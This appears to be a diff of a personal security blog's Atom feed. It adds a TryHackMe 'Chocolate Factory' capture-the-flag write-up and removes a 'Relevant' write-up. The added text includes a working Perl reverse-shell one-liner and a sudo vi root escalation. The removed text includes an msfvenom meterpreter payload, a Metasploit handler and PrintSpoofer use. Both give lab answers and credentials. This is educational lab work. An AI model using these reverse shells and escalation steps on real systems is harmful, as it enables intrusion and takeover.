@@ -1,4 +1,198 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-28T17:39:56+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-29T15:31:08+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe Chocolate Factory</title><link href="http://localhost:4000/tryhackme-chocolate-factory/" rel="alternate" type="text/html" title="TryHackMe Chocolate Factory" /><published>2023-03-29T00:00:00+03:00</published><updated>2023-03-29T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chocolate-factory</id><content type="html" xml:base="http://localhost:4000/tryhackme-chocolate-factory/"><![CDATA[<p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!</p>
+
+<p><br /></p>
+
+<h2 id="1-introduction">1. Introduction</h2>
+
+<p>Welcome to Willy Wonka’s Chocolate Factory!</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket" /></p>
+
+<p>This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa</p>
+
+<p>This is a beginner friendly room!</p>
+
+<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>
+
+<p>( Created by AndyInfosec team for the community! )</p>
+
+<p><br /></p>
+
+<h2 id="2-challenges">2. Challenges</h2>
+
+<p><br /></p>
+
+<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap" /></p>
+
+<p>A lot of ports are open.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home" /></p>
+
+<p>I see a login page. Let’s do a gobuster scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster" /></p>
+
+<p>We found a few php files. First, let’s look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php" /></p>
+
+<p>We can run commands on this page. Let’s connect with burp suite. Capture the page and send it to the repeater.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls" /></p>
+
+<p>Let’s look at the files in the directory in order, of what we will find.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>
+
+    <p>I don’t see anything significant here.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak" /></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>
+
+    <p>This file is probably a script because the cat command doesn’t work.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key" /></p>
+
+    <p>Let’s back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat" /></p>
+
+    <p>Let’s try.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
+ $ ./key_rev_key 
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try" /></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings" /></p>
+
+    <p>Let’s try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key" /></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>
+
+    <p>We found the username and password for the website.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate" /></p>
+  </li>
+</ul>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: cn7824</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>
+
+<p>Now, we can execute a reverse-shell command on home.php. First, let’s go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey’s cheat sheet</a>. You can try all of them.</p>
+
+<p>Perl, python, and netcat are working.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<p>First, let’s setup a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>After copying and pasting.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse" /></p>
+
+<p>We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first" /></p>
+
+<p>Now, we can change the user to charlie.</p>
+
+<p>We found a RSA key in charlie’s directory</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa" /></p>
+
+<p>Let’s connect to charlie ssh.</p>
+
+<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
+$ ssh -i id_rsa charlie@10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh" /></p>
+
+<p>And we are inside.</p>
+
+<p><br /></p>
+
+<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>
+
+<p>Now, let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>
+
+<p>Now, we checking the sudo privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l" /></p>
+
+<p>We can get root privileges using vi. I’m going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins" /></p>
+
+<p>Now, we can root privilege using this command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc" /></p>
+
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>
 
 <p><br /></p>
 
@@ -1560,177 +1754,4 @@ But now we can get to root.txt.</p>
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="xxe," /><category term="privesc," /><category term="enumeraton" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>
-
-<p><br /></p>
-
-<h2 id="1-pre-engagement-briefing">1. Pre-Engagement Briefing</h2>
-
-<p>You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.</p>
-
-<p>Scope of Work</p>
-
-<p>The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>
-
-<ul>
-  <li>User.txt</li>
-  <li>Root.txt</li>
-</ul>
-
-<p>Additionally, the client has provided the following scope allowances:</p>
-
-<ul>
-  <li>Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first</li>
-  <li>Locate and note all vulnerabilities found</li>
-  <li>Submit the flags discovered to the dashboard</li>
-  <li>Only the IP address assigned to your machine is in scope</li>
-  <li>Find and report ALL vulnerabilities (yes, there is more than one path to root)</li>
-</ul>
-
-<p>(Roleplay off)
-I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.</p>
-
-<p>Note - Nothing in this room requires Metasploit</p>
-
-<p>Machine may take up to 5 minutes for all services to start.</p>
-
-<p><strong>Writeups will not be accepted for this room.</strong></p>
-
-<p><br /></p>
-
-<h3 id="11-user-flag">1.1 User Flag?</h3>
-
-<p>Let’s do a nmap scan first.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -P- 10.10.7.6
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/nmap.png" alt="nmap" /></p>
-
-<p>And we found a few ports that will work for us. These are 80/tcp HTTP, 49663/tcp HTTP, and 445/tcp</p>
-
-<p>I did a gobuster scan, and the connection to both HTTP ports, probably due to my VPN, was very slow, I couldn’t wait, so I couldn’t get any results from the gobuster scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.7.6:49663/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/gobuster.png" alt="gobuster" /></p>
-
-<p>So I decided to try SMB login.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient -L //10.10.7.6
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/smb.png" alt="smb" /></p>
-
-<p>There is no password.</p>
-
-<p>We found this <code class="language-plaintext highlighter-rouge">nt4wrksv</code>. Now, let’s try to get in here.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient //10.10.7.6/nt4wrksv
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/password.png" alt="password" /></p>
-
-<p>We found the passwords.txt file. Let’s see what’s in it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; get passwords.txt
-&gt; exit
-$ cat passwords.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/smbin.png" alt="smbin" /></p>
-
-<p>This file contains base64 encoded credentials:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "Qm9iIVBAJCRXMHJEITRyMw==" | base64 -d
-$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA20TY5NjkhJCQK" | base4 -d
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/base64.png" alt="base64" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Bob : !P@$$W0rD!123</code></strong></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Bill: Juw4nnaM4n420696969!$$$</code></strong></p>
-
-<p>You have access to SMB, so let’s check if we can install and run the reverse shell.</p>
-
-<p>First, let’s create a reverse shell. Then let’s put it in SMB.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.168.86 lport=4444 -f aspx -o shell.aspx
-$ smbclient //10.10.7.6/nt4wrksv
-$ put shell.aspx 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/payload.png" alt="payload" /></p>
-
-<p>Now let’s create a listener using metasploit.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
-&gt; use exploit/multi/handler
-&gt; set payload windows/x64/meterpreter_reverse_tcp
-&gt; set LHOST 10.8.168.86
-&gt; set LPORT 4444
-&gt; run
-</code></pre></div></div>
-<p>And call the reverse shell in the browser <strong><code class="language-plaintext highlighter-rouge">http://10.10.7.6:49663/nt4wrksv/shell.aspx</code></strong></p>
-
-<p>And we are inside.</p>
-
-<p><img src="/assets/img/tryhackme/relevant/info.png" alt="info" /></p>
-
-<p>Now we can get the user flag.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cd c:/Users/Bob/Desktop
-&gt; cat user.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<h3 id="12-root-flag">1.2 Root Flag?</h3>
-
-<p>We need to do an authorization elevation for the root flag. 
-Running the “whoami /priv” command to check the current user’s privileges in the system:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
-&gt; whoami /priv
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/priv.png" alt="priv" /></p>
-
-<p>It appears the current user has the SeImpersonatePrivilege token enabled, which means token impersonation could be used to escalate privileges.</p>
-
-<p>Although Juicy Potato is normally used to exploit token impersonation, this only works if DCOM is enabled on the server. A great alternative is the PrintSpoofer exploit. Downloading the exploit from the Git repository and placing it on the nt4wrksv SMB share so it can be easily transferred to the target machine: <a href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">PrintSpoofer</a></p>
-
-<p>First, let’s download the file and put it in SMB, then run it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-$ smbclient //10.10.7.6/nt4wrksv
-$ put PrintSpoofer64.exe
-</code></pre></div></div>
-
-<p>Let’s go back to shell and follow.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cd \inetpub\wwwroot\nt4wrksv
-&gt; dir
-&gt; PrintSpoofer64.exe -i -c powershell.exe
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/relevant/privesc.png" alt="privesc" /></p>
-
-<p>And now we have root privileges. Now we can reach the root flag.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd c:/Users/Administrator/Desktop
-$ cat root.txt
-</code></pre></div></div>
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="pentest," /><category term="security," /><category term="accessible" /><summary type="html"><![CDATA[Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/relevant.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/relevant.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="xxe," /><category term="privesc," /><category term="enumeraton" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
